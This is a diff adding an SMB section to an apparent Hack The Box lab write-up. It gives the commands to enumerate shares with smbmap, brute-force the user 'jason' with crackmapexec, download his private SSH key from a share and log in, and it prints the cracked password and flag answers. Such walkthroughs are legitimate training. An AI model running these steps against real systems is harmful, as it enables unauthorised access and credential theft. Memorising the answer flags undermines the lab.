@@ -1,6 +1,7 @@
 # HTB-Attacking_Common_Services
 ## Table of Contents
 1. [FTP](#ftp)
+2. [SMB](#smb)
 
 ### FTP
 #### Tools
@@ -40,3 +41,41 @@
 3. Using the credentials obtained earlier, retrieve the flag.txt file. Submit the contents as your answer.
 
     By using the credential that we found, we can get the flag. The answer is `HTB{ATT4CK1NG_F7P_53RV1C3}`.
+
+### SMB
+#### Tools
+1. impacket-psexec
+2. CrackMapExec
+3. enum4linux-ng
+#### Challenges
+1. What is the name of the shared folder with READ permissions?
+
+    We can solve this by using `smbmap` with `-H` flag.
+
+    ```bash
+    smbmap -H 10.129.55.8
+    ```
+    The answer is `GGJ`.
+
+2. What is the password for the username "jason"?
+
+    We can bruteforce by using `crackmapexec` to get the password.
+
+    ```bash
+    crackmapexec smb 10.129.55.8 -u "jason" -p pws.list --local-auth
+    ```
+    The answer is `34c8zuNBo91!@28Bszh`.
+
+3. Login as the user "jason" via SSH and find the flag.txt file. Submit the contents as your answer.
+
+    To solve this, we need `id_rsa` from GGJ shares. We can download it by using jason credential.
+
+    ```bash
+    smbmap -H 10.129.55.8 -u 'jason' -p '34c8zuNBo91!@28Bszh' --download "GGJ\id_rsa"
+    ```
+    Ater that, change id_rsa permission (600). Then we can ssh to there.
+
+    ```bash
+    ssh -o KexAlgorithms=diffie-hellman-group14-sha256 -o Ciphers=aes256-ctr -i id_rsa jason@10.129.203.6 -v
+    ```
+    The answer is `HTB{SMB_4TT4CKS_2349872359}`.
